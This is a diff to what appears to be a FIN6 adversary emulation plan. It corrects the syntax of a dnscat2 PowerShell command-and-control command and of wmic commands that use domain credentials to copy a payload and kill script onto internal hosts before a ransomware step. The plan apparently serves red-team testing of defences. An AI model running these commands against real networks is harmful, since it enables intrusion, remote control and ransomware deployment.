@@ -149,7 +149,7 @@ Example: ruby dnscat2.rb --dns="domain=example.com" --no cache
 ##### dnscat2 PowerShell Client
 
 ```sh
-Start-Dnscat2 -Domain #{dnscat2 server} Exec cmd
+Start-Dnscat2 -Domain #{dnscat2 server} -Exec cmd
 ```
 
 ---
@@ -309,13 +309,13 @@ copy kill.bat \\#{Distribution Server}\c$\windows\temp\
 FIN6 Procedure
 
 ```sh
-wmic /node:#{internal IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+wmic /node:#{internal_IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\"
 ```
 
 FIN6 Procedure
 
 ```sh
-wmic /node:#{internal IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\windows.bat or kill.bat c:\windows\temp\"
+wmic /node:#{internal_IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\windows.bat or kill.bat c:\windows\temp\"
 ```
 
 #### 7.3 Execute the kill script and then the ransomware.<sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>
